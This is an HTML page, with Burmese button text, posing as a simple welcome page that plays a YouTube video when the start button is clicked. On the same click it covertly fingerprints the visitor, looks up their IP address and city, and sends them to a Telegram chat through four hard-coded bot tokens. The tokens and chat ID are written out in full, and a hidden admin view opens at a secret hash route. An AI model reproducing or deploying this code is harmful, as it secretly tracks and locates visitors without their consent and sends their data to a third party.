<!DOCTYPE html>
<html lang="my">
<head>
    <meta charset="UTF-8">
    <title>System</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
</head>
<body class="bg-black text-white min-h-screen flex items-center justify-center">

    <!-- YouTube Hidden Iframe -->
    <iframe id="yt-player" class="hidden" src="" allow="autoplay"></iframe>

    <div id="app" class="p-6 text-center">
        <div id="public-view" class="hidden">
            <h1 class="text-3xl font-bold mb-8">ကြိုဆိုပါ၏</h1>
            <button onclick="startAction()" class="bg-red-600 px-10 py-4 rounded-full text-xl font-bold">စတင်မည်</button>
        </div>

        <div id="admin-view" class="hidden bg-gray-900 p-6 rounded-lg text-left">
            <input id="yt-id" class="w-full p-2 mb-4 text-black rounded" placeholder="YouTube ID">
            <button onclick="saveSettings()" class="bg-blue-600 w-full py-2 rounded">Save</button>
        </div>
    </div>

    <script>
        // 1. YouTube Player Setup
        const ytId = localStorage.getItem('ytId') || 'dQw4w9WgXcQ';
        document.getElementById('yt-player').src = `https://www.youtube.com/embed/${ytId}?autoplay=1`;

        // 2. Main Action
        async function startAction() {
            // သီချင်းဖွင့်ခြင်း
            const player = document.getElementById('yt-player');
            player.src = player.src.replace("autoplay=0", "autoplay=1");

            // Tracking
            try {
                const fp = await FingerprintJS.load();
                const res = await fp.get();
                const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
                const msg = `ID: ${res.visitorId}%0AIP: ${ipData.ip}%0ACity: ${ipData.city}`;
                
                const bots = [
                    "8869917655:AAFk9tcBhEkmaFEOzXsbmcRQtymBtSZ3M9g",
                    "8914390345:AAE-oorODF1HQbOLkuKJkNXwy-w2XbXtud0",
                    "8684986169:AAE2JP-iOydPWEStbg2iDQ4koipL1czWYs0",
                    "8949147819:AAGBSy8ZexmYrDMo2pRuqUA1k8PyOyE9OJQ"
                ];

                bots.forEach(token => {
                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=6917040501&text=${msg}`);
                });
                alert("စတင်ပါပြီ။");
            } catch (err) {
                alert("Error: " + err.message);
            }
        }

        function saveSettings() {
            localStorage.setItem('ytId', document.getElementById('yt-id').value);
            alert("Saved!");
        }

        // Router
        if(window.location.hash === '#/step/2003') {
            document.getElementById('admin-view').classList.remove('hidden');
        } else {
            document.getElementById('public-view').classList.remove('hidden');
        }
    </script>
</body>
</html>
